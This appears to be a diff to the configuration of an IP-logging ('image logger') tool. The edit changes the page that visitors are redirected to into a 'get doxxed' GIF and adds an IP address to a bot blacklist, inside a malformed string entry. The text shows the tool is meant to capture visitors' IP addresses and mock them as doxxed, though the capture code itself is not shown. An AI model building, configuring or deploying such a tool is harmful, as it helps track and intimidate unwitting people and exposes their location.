@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": True, # Redirect to a webpage?
-        "page": "https://tenor.com/view/cat-tongue-cat-cats-ahh-excited-gif-6508383405014947627" # Link to the webpage to redirect to 
+        "page": "https://tenor.com/view/omori-doxxed-get-doxxed-idiot-gif-16209759885120265120" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
@@ -63,7 +63,7 @@ config = {
     # 4) Image 
 }
 
-blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
+blacklistedIPs = ("27", "104", "143", "164, 47.12.80.76") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                            # This feature is undocumented mainly due to it being for detecting bots better.
 
 def botCheck(ip, useragent):
